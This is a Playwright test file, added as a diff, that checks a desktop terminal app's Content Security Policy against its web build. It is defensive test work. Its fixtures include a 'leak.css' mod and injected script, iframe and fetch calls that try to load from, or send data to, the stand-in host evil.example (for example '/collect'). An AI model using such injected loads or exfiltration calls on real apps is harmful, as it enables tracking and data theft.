@@ -1,0 +1,212 @@
+import { readFileSync } from "node:fs";
+import { expect, test } from "@playwright/test";
+import type { Page } from "@playwright/test";
+import { openSettings, seedConfig } from "./settings-fixture";
+
+// The Content Security Policy of the desktop app (apps/desktop/src-tauri/tauri.conf.json) applied to
+// the web build. The web build is the same page, so serving it with the policy of the app shows what
+// the policy would stop in the real window: nothing the app does may be blocked, and what a mod or a
+// file tries to load from the network must be. The policy is read from the config file itself, so
+// the test cannot drift from what the app ships.
+
+const conf = JSON.parse(
+  readFileSync(new URL("../apps/desktop/src-tauri/tauri.conf.json", import.meta.url), "utf8"),
+) as { app: { security: { csp: Record<string, string> } } };
+const POLICY = Object.entries(conf.app.security.csp)
+  .map(([directive, sources]) => `${directive} ${sources}`)
+  .join("; ");
+
+interface Violation {
+  directive: string;
+  blocked: string;
+}
+interface Hook {
+  paneIds(): string[];
+  setMod(name: string, text: string | null): void;
+}
+type CspWindow = Window & { __norenTest?: Hook; __violations?: Violation[] };
+
+const WEB_IMAGES_KEY = "noren.web.images";
+const WEB_MODS_KEY = "noren.web.mods";
+const PICTURE = "fixtures/background.png";
+const FIXTURE = readFileSync(new URL("./fixtures/background.png", import.meta.url));
+
+/** Serves the page with the policy of the app and records every violation the page reports. */
+async function underPolicy(page: Page, policy = POLICY): Promise<string[]> {
+  const problems: string[] = [];
+  page.on("pageerror", (error) => problems.push(`pageerror: ${error.message}`));
+  page.on("console", (message) => {
+    // The driver chats about the GPU in the console; only what the policy says matters here.
+    if (/content security policy|refused to/i.test(message.text())) {
+      problems.push(`console: ${message.text()}`);
+    }
+  });
+  await page.route("**/*", async (route) => {
+    if (route.request().resourceType() !== "document") return route.continue();
+    const response = await route.fetch();
+    await route.fulfill({
+      response,
+      headers: { ...response.headers(), "content-security-policy": policy },
+    });
+  });
+  await page.addInitScript(() => {
+    const seen: Violation[] = [];
+    (window as CspWindow).__violations = seen;
+    document.addEventListener("securitypolicyviolation", (event) => {
+      seen.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
+    });
+  });
+  return problems;
+}
+
+const violations = (page: Page): Promise<Violation[]> =>
+  page.evaluate(() => (window as CspWindow).__violations ?? []);
+
+async function start(page: Page): Promise<void> {
+  await page.goto("/");
+  await expect
+    .poll(() => page.evaluate(() => (window as CspWindow).__norenTest?.paneIds().length ?? 0))
+    .toBe(1);
+}
+
+test("the policy is the strict one the app ships", () => {
+  expect(POLICY).toContain("default-src 'none'");
+  expect(POLICY).toContain("script-src 'self'");
+  expect(POLICY).not.toContain("unsafe-eval");
+  expect(POLICY).not.toMatch(/https?:\/\/(?!ipc\.localhost)/);
+});
+
+test("the app runs under the policy: terminal, palette, settings, mods and a picture raise no violation", async ({
+  page,
+}) => {
+  const problems = await underPolicy(page);
+  await page.addInitScript(
+    ({ imagesKey, images, modsKey, mods }) => {
+      window.localStorage.setItem(imagesKey, images);
+      window.localStorage.setItem(modsKey, mods);
+    },
+    {
+      imagesKey: WEB_IMAGES_KEY,
+      images: JSON.stringify({ [PICTURE]: FIXTURE.toString("base64") }),
+      modsKey: WEB_MODS_KEY,
+      mods: JSON.stringify({
+        "tint.css":
+          "[data-nr-part='sidebar'] { background: rgb(10, 40, 20); } .xterm { outline: 1px solid red; }",
+      }),
+    },
+  );
+  await seedConfig(
+    page,
+    `{ "mods": ["tint.css"], "appearance": { "background": { "image": "${PICTURE}", "opacity": 0.3, "blur": 4 } } }`,
+  );
+  await start(page);
+
+  // The picture is drawn from memory (a blob), a style element of a mod is in force, and a terminal
+  // is on screen: the three things that need the relaxed or unusual sources of the policy.
+  await expect(page.locator('[data-nr-part="background"]')).toHaveCount(1);
+  expect(
+    await page
+      .locator('[data-nr-part="background"]')
+      .evaluate((element) => getComputedStyle(element).backgroundImage),
+  ).toMatch(/^url\("blob:/);
+  await expect(page.locator("style[data-nr-mod='tint.css']")).toHaveCount(1);
+  await expect(page.locator(".xterm").first()).toBeVisible();
+
+  await page.keyboard.press("Control+Shift+P");
+  await expect(page.getByRole("dialog", { name: /command palette/i })).toBeVisible();
+  await page.keyboard.press("Escape");
+
+  const settings = await openSettings(page);
+  await settings.getByRole("button", { name: "Cancel", exact: true }).click();
+  await page.getByRole("button", { name: "New space", exact: true }).click();
+  await expect(page.getByRole("dialog", { name: "New space", exact: true })).toBeVisible();
+  await page.keyboard.press("Escape");
+
+  expect(await violations(page)).toEqual([]);
+  expect(problems).toEqual([]);
+});
+
+test("what a mod tries to load from the network is blocked", async ({ page }) => {
+  await underPolicy(page);
+  const evil = "https://evil.example";
+  const requested: string[] = [];
+  // A request that the policy lets through would reach this route; a refused one never does.
+  await page.route("https://evil.example/**", (route) => {
+    requested.push(route.request().url());
+    return route.abort();
+  });
+  await page.addInitScript(({ key, mods }) => window.localStorage.setItem(key, mods), {
+    key: WEB_MODS_KEY,
+    mods: JSON.stringify({
+      "leak.css": [
+        `@import url("${evil}/theme.css");`,
+        `body { background-image: url("${evil}/pixel.png"); }`,
+        `@font-face { font-family: Leak; src: url("${evil}/font.woff2"); }`,
+        `.xterm { font-family: Leak, monospace; cursor: url("${evil}/cursor.png"), auto; }`,
+        `[data-nr-part="sidebar"] { background: rgb(1, 2, 3); }`,
+      ].join("\n"),
+    }),
+  });
+  await seedConfig(page, `{ "mods": ["leak.css"] }`);
+  await start(page);
+  await expect(page.locator("style[data-nr-mod='leak.css']")).toHaveCount(1);
+  // The rest of the mod still applies; only the loads are refused.
+  await expect
+    .poll(() =>
+      page
+        .locator('[data-nr-part="sidebar"]')
+        .first()
+        .evaluate((element) => getComputedStyle(element).backgroundColor),
+    )
+    .toBe("rgb(1, 2, 3)");
+
+  await expect
+    .poll(async () => (await violations(page)).filter((v) => v.blocked.includes(evil)).length)
+    .toBeGreaterThanOrEqual(3);
+  const blocked = await violations(page);
+  const hostile = blocked.filter((v) => v.blocked.includes(evil));
+  // The picture and the cursor are images, the face is a font. (`@import` cannot be a rule inside
+  // the layer the mod is wrapped in, so it loads nothing at all.)
+  expect(new Set(hostile.map((v) => v.directive))).toEqual(new Set(["img-src", "font-src"]));
+  expect(requested).toEqual([]);
+});
+
+test("a page that tries to run a script or open a frame from the outside is refused", async ({
+  page,
+}) => {
+  await underPolicy(page);
+  await start(page);
+  await page.evaluate(() => {
+    const script = document.createElement("script");
+    script.src = "https://evil.example/x.js";
+    document.head.append(script);
+    const inline = document.createElement("script");
+    inline.textContent = "window.__ran = true";
+    document.head.append(inline);
+    const frame = document.createElement("iframe");
+    frame.src = "https://evil.example/";
+    document.body.append(frame);
+    void fetch("https://evil.example/collect").catch(() => undefined);
+  });
+  await expect.poll(async () => (await violations(page)).length).toBeGreaterThanOrEqual(4);
+  const directives = new Set((await violations(page)).map((v) => v.directive));
+  // The inline script and the remote one are both elements; eval itself cannot be tried from here
+  // (the test driver evaluates with the policy off), but the page raised none on its own above.
+  for (const directive of ["script-src-elem", "frame-src", "connect-src"]) {
+    expect(directives.has(directive), directive).toBe(true);
+  }
+  expect(await page.evaluate(() => "__ran" in window)).toBe(false);
+});
+
+test("inline styles are why style-src keeps unsafe-inline: the terminal writes a style element of its own", async ({
+  page,
+}) => {
+  await underPolicy(page, POLICY.replace("style-src 'self' 'unsafe-inline'", "style-src 'self'"));
+  await start(page);
+  // xterm.js 6 puts a <style> inside every terminal (the colors of its scrollbar) and has no option
+  // for a nonce; a mod is a <style> too. Without `unsafe-inline` both are refused.
+  await expect
+    .poll(async () => (await violations(page)).map((v) => v.directive))
+    .toContain("style-src-elem");
+  expect(await page.locator(".xterm style").count()).toBeGreaterThan(0);
+});
